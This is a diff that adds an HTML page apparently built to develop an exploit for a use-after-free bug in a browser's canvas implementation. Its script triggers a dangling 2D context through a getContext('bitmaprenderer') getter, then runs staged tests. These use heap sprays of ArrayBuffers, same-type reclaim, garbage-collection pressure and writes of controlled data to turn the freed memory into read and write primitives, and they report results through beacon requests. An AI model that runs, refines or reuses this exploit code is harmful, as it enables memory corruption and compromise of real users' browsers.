@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V547</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V547-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      innerCtx.lineWidth=11111.11111;
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V547-save-detect');
+
+// T1: Same-type reclaim control (fast, known working)
+(function T1(){
+  b('T1-START','control');
+  var ctx=triggerUAF();
+  var ctxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    ctxs.push(c.getContext('2d'));
+  }
+  var lw=ctx.lineWidth;
+  b('T1-LW','val='+lw);
+})();
+
+// T2: AB spray + save() write detection
+// save() does ++m_unrealizedSaveCount — writes 1 byte to a specific offset
+// We snapshot all ABs, call save(), then compare to find the changed byte
+(function T2(){
+  b('T2-START','AB spray + save detect');
+  var ctx=triggerUAF();
+  b('T2-UAF','ok');
+
+  // Spray 300 AB(768) with all zeros
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    abs.push({ab:ab, u8:new Uint8Array(ab), dv:new DataView(ab)});
+  }
+  b('T2-SPRAY','300 zero ABs');
+
+  // Snapshot BEFORE save
+  var snaps=[];
+  for(var i=0;i<abs.length;i++){
+    snaps.push(new Uint8Array(abs[i].ab.slice(0)));
+  }
+
+  // Call save() on the dangling ref
+  b('T2-PRE-SAVE','calling save()');
+  try{
+    ctx.save();
+    b('T2-SAVE-OK','save returned');
+  }catch(e){
+    b('T2-SAVE-ERR',e.message);
+  }
+
+  // Compare: find which AB changed and at what offset
+  var hitCount=0;
+  for(var i=0;i<abs.length;i++){
+    for(var j=0;j<768;j++){
+      if(abs[i].u8[j]!==snaps[i][j]){
+        var diffs=[];
+        for(var jj=Math.max(0,j-4);jj<Math.min(768,j+24);jj++){
+          if(abs[i].u8[jj]!==snaps[i][jj]){
+            diffs.push('off'+jj+':0x'+snaps[i][jj].toString(16)+'->0x'+abs[i].u8[jj].toString(16));
+          }
+        }
+        b('T2-HIT','AB['+i+'] '+diffs.join(','));
+        hitCount++;
+        break;
+      }
+    }
+    if(hitCount>=3)break;
+  }
+  if(hitCount===0)b('T2-MISS','no AB bytes changed after save()');
+})();
+
+// T3: AB spray + save() x5 to amplify
+(function T3(){
+  b('T3-START','AB spray + save x5');
+  var ctx=triggerUAF();
+  b('T3-UAF','ok');
+
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    abs.push({ab:ab, u8:new Uint8Array(ab), dv:new DataView(ab)});
+  }
+  b('T3-SPRAY','300 zero ABs');
+
+  var snaps=[];
+  for(var i=0;i<abs.length;i++){
+    snaps.push(new Uint8Array(abs[i].ab.slice(0)));
+  }
+
+  b('T3-PRE-SAVE','calling save() x5');
+  try{
+    ctx.save();
+    ctx.save();
+    ctx.save();
+    ctx.save();
+    ctx.save();
+    b('T3-SAVE-OK','5 saves returned');
+  }catch(e){
+    b('T3-SAVE-ERR',e.message);
+  }
+
+  // Find changed bytes (should see value 5 at m_unrealizedSaveCount offset)
+  var hitCount=0;
+  for(var i=0;i<abs.length;i++){
+    for(var j=0;j<768;j++){
+      if(abs[i].u8[j]!==snaps[i][j]){
+        var diffs=[];
+        for(var jj=Math.max(0,j-4);jj<Math.min(768,j+24);jj++){
+          if(abs[i].u8[jj]!==snaps[i][jj]){
+            diffs.push('off'+jj+':0x'+snaps[i][jj].toString(16)+'->0x'+abs[i].u8[jj].toString(16));
+          }
+        }
+        b('T3-HIT','AB['+i+'] '+diffs.join(','));
+        hitCount++;
+        break;
+      }
+    }
+    if(hitCount>=3)break;
+  }
+  if(hitCount===0)b('T3-MISS','no AB bytes changed after 5x save()');
+})();
+
+// T4: Alias identification — set lineWidth=12345.6789 through dangling ref,
+// then check which of 200 new contexts has that value
+(function T4(){
+  b('T4-START','alias identification');
+  var ctx=triggerUAF();
+  b('T4-UAF','ok');
+
+  var ctxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    var newctx=c.getContext('2d');
+    newctx.lineWidth=i+1; // unique per context
+    ctxs.push(newctx);
+  }
+  b('T4-RECLAIM','200 contexts with unique lw');
+
+  // Set through dangling ref
+  ctx.lineWidth=12345.6789;
+  b('T4-SET','lw=12345.6789 via dangling');
+
+  // Find which context now has 12345.6789
+  var found=-1;
+  for(var i=0;i<ctxs.length;i++){
+    if(ctxs[i].lineWidth===12345.6789){
+      found=i;
+      break;
+    }
+  }
+  if(found>=0){
+    b('T4-FOUND','context['+found+'] has our lw! (was '+(found+1)+')');
+  }else{
+    b('T4-NOTFOUND','no context has 12345.6789');
+    // Report first few lineWidths
+    var sample=[];
+    for(var i=0;i<10;i++)sample.push(i+':'+ctxs[i].lineWidth);
+    b('T4-SAMPLE',sample.join(','));
+  }
+})();
+
+// T5: Two-stage: same-type reclaim → delete all → AB spray
+// After same-type reclaim, delete all new contexts → re-frees the slot
+// Then AB spray should reclaim it with OUR data, but m_stateStack.m_buffer
+// still has the old valid pointer (points to inline buffer inside the same slot)
+(function T5(){
+  b('T5-START','two-stage: reclaim -> delete -> AB');
+  var ctx=triggerUAF();
+  b('T5-UAF','ok');
+
+  // Stage 1: same-type reclaim
+  var ctxs=[];
+  var canvases=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    canvases.push(c);
+    ctxs.push(c.getContext('2d'));
+  }
+  b('T5-RECLAIM','200 contexts');
+
+  // Verify alias works
+  var lw1=ctx.lineWidth;
+  b('T5-LW1','val='+lw1);
+
+  // Stage 2: null out all refs to force GC of new contexts
+  for(var i=0;i<200;i++){
+    canvases[i].width=0; // detach context
+    canvases[i]=null;
+    ctxs[i]=null;
+  }
+  canvases=null;
+  ctxs=null;
+  b('T5-NULLED','all refs nulled');
+
+  // Try to force GC
+  try{
+    var gcjunk=[];
+    for(var g=0;g<5000;g++)gcjunk.push(new ArrayBuffer(1024));
+    gcjunk=null;
+  }catch(e){}
+  b('T5-GC','gc pressure applied');
+
+  // Stage 3: AB spray
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    // Write lineWidth value at State+48 = offset 176 (128 inline buffer + 48)
+    dv.setFloat64(176,77777.77777,true);
+    abs.push(ab);
+  }
+  b('T5-SPRAY','300 ABs with lw=77777 at off176');
+
+  // Try reading lineWidth through dangling ref
+  // If the old m_buffer still points to inline buffer (now AB data),
+  // lineWidth reads from AB offset 176
+  try{
+    var lw2=ctx.lineWidth;
+    b('T5-LW2','!!!val='+lw2+'!!!');
+  }catch(e){b('T5-LW2-ERR',e.message)}
+})();
+
+b('DONE','V547-all-complete');
+</script>
+</body></html>
